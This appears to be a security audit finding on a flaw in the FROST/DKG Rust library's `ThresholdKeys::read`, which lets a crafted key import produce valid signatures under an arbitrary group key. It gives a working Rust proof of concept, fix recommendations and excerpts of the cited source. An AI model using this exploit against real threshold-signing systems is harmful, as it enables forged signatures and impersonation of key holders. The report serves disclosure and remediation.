### Title
Crafted `ThresholdKeys` imports permit signing under an arbitrary group key - ([File: crypto/dkg/src/lib.rs])

### Summary
`ThresholdKeys::read` accepts an attacker-supplied participant index, secret share, interpolation mode, and verification-share map, then reconstructs the group key solely from participants `1..=t`. It does not verify that the selected participant’s `secret_share` corresponds to `verification_shares[i]`, nor that the remaining verification shares are consistent shares of the reconstructed group key. [1](#0-0) [2](#0-1) 

### Finding Description
`ThresholdKeys::new` derives `group_key` by interpolating only the first `t` verification shares and stores the map without checking its consistency with `params.i()` or `secret_share`. [3](#0-2) 

For example, with `t = 1`, `n = 2`, and `i = 2`, an attacker can set `verification_shares[1]` to any target public key `G*` while setting `verification_shares[2] = G * x` and `secret_share = x` for a scalar `x` they know. Deserialization accepts this object, and `view([2])` creates a valid one-party signing view whose group key remains the attacker-selected `G*`. [4](#0-3) 

FROST permits the singleton signing set because its size equals `t`, contains participant `2`, and has no duplicates or out-of-range indexes. [5](#0-4)  Final completion then verifies the summed share against `view.group_key()`, which is the forged target key rather than an independently authenticated group key. [6](#0-5) 

### Impact Explanation
Any consumer that accepts serialized `ThresholdKeys` from an untrusted party and treats the resulting `group_key()` or participant index as authoritative can receive a valid signature for a key the attacker was never authorized to represent. This is analogous to importing an archive that grants an unauthorized principal elevated privileges: the imported object itself manufactures both the privileged identity and the public-key mapping used to authorize its actions. [7](#0-6) [8](#0-7) 

### Likelihood Explanation
The issue is reachable wherever serialized threshold-key backups, archives, synchronization payloads, or peer-supplied key packages are passed to `ThresholdKeys::read`. The primitive encodings are canonical and the individual participant share is internally valid; exploitation requires only replacing the authorization metadata—the participant assignment and unrelated verification shares—during import. [9](#0-8) 

### Recommendation
Do not treat the serialized verification-share map as self-authenticating authorization data. `ThresholdKeys` imports should be bound to an externally authenticated group key and participant roster, and deserialization should reject keys whose group identity does not match that trusted value. [10](#0-9) 

The constructor/import path should also verify `C::generator() * secret_share == verification_shares[i]`, and preferably validate that every allowed `t`-participant interpolation of the supplied verification shares produces the same authenticated group key, or authenticate a DKG commitment/transcript root that proves that invariant. [11](#0-10) 

### Proof of Concept
The following shape demonstrates the issue for a `1-of-2` key object imported as participant `2`:

```rust
use std::collections::HashMap;
use zeroize::Zeroizing;
use rand_core::OsRng;
use ciphersuite::{Ciphersuite, group::{ff::PrimeField, GroupEncoding}};
use frost::{
  curve::{Curve, Ristretto, IetfRistrettoHram},
  algorithm::{Algorithm, Hram, IetfSchnorr},
  sign::PreprocessMachine,
  Participant,
};

// Attacker-known scalar for claimed participant 2.
let x = Ristretto::random_nonzero_F(&mut OsRng);
let own_share = Ristretto::generator() * x;

// Arbitrary target public key imported as participant 1's verification share.
// Because t = 1, ThresholdKeys::new sets group_key = verification_shares[1].
let target_group_key = own_share + Ristretto::generator();

// Serialized format used by ThresholdKeys::read:
// C::ID length, C::ID, t, n, i, interpolation tag, secret, verification shares 1..=n.
let mut imported = vec![];
imported.extend(u32::try_from(Ristretto::ID.len()).unwrap().to_le_bytes());
imported.extend(Ristretto::ID);
imported.extend(1u16.to_le_bytes()); // t
imported.extend(2u16.to_le_bytes()); // n
imported.extend(2u16.to_le_bytes()); // i = Participant(2)
imported.push(1);                    // Interpolation::Lagrange
imported.extend(x.to_repr().as_ref());
imported.extend(target_group_key.to_bytes().as_ref()); // share 1: forged group key
imported.extend(own_share.to_bytes().as_ref());        // share 2: G*x

let keys =
  frost::ThresholdKeys::<Ristretto>::read(&mut imported.as_slice()).unwrap();
assert_eq!(keys.params().i(), Participant::new(2).unwrap());
assert_eq!(keys.group_key(), target_group_key);

let (machine, _preprocess) =
  frost::sign::AlgorithmMachine::new(
    IetfSchnorr::<Ristretto, IetfRistrettoHram>::ietf(),
    keys,
  )
  .preprocess(&mut OsRng);

let msg = b"attacker-controlled message";
let (machine, _share) = machine.sign(HashMap::new(), msg).unwrap();
let signature = machine.complete(HashMap::new()).unwrap();

// Valid Schnorr signature under the attacker-selected target_group_key.
assert!(signature.verify(
  target_group_key,
  IetfRistrettoHram::hram(&signature.R, &target_group_key, msg),
));
```

The malicious object succeeds because participant `2`’s scalar is consistent with `verification_shares[2]`, while `verification_shares[1]`—the sole source of the reconstructed group key—is set directly to the target key. [10](#0-9) [12](#0-11)

        interpolation,

        group_key,
        verification_shares,

      offset: C::F::ZERO,
    })

  pub fn view(&self, mut included: Vec<Participant>) -> Result<ThresholdView<C>, DkgError> {
    if (included.len() < self.params().t.into()) ||
      (usize::from(self.params().n()) < included.len())
    {
      Err(DkgError::IncorrectAmountOfParticipants {
        t: self.params().t,
        n: self.params().n,
        amount: included.len(),
      })?;
    }
    included.sort();
    {
      let mut found = included[0] == self.params().i();
      for i in 1 .. included.len() {
        if included[i - 1] == included[i] {
          Err(DkgError::DuplicatedParticipant(included[i]))?;
        }
        found |= included[i] == self.params().i();
      }
      if !found {
        Err(DkgError::NotParticipating)?;
      }
    }
    {
      let last = *included.last().unwrap();
      if u16::from(last) > self.params().n() {
        Err(DkgError::InvalidParticipant { n: self.params().n(), participant: last })?;
      }
    }

    // The interpolation occurs multiplicatively, letting us scale by the scalar now
    let secret_share_scaled = Zeroizing::new(self.scalar * self.original_secret_share().deref());
    let mut secret_share = Zeroizing::new(
      self.core.interpolation.interpolation_factor(self.params().i(), &included) *
        secret_share_scaled.deref(),
    );

    let mut verification_shares = HashMap::with_capacity(included.len());
    for i in &included {
      let verification_share = self.core.verification_shares[i];
      let verification_share = verification_share *
        self.scalar *
        self.core.interpolation.interpolation_factor(*i, &included);
      verification_shares.insert(*i, verification_share);
    }

    /*
      The offset is included by adding it to the participant with the lowest ID.

      This is done after interpolating to ensure, regardless of the method of interpolation, that
      the method of interpolation does not scale the offset. For Lagrange interpolation, we could
      add the offset to every key share before interpolating, yet for Constant interpolation, we
      _have_ to add it as we do here (which also works even when we intend to perform Lagrange
      interpolation).
    */
    if included[0] == self.params().i() {
      *secret_share += self.offset;
    }
    *verification_shares.get_mut(&included[0]).unwrap() += C::generator() * self.offset;

    Ok(ThresholdView {
      interpolation: self.core.interpolation.clone(),
      scalar: self.scalar,
      offset: self.offset,
      group_key: self.group_key(),
      secret_share,
      original_verification_shares: self.core.verification_shares.clone(),
      verification_shares,
      included,
    })

  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
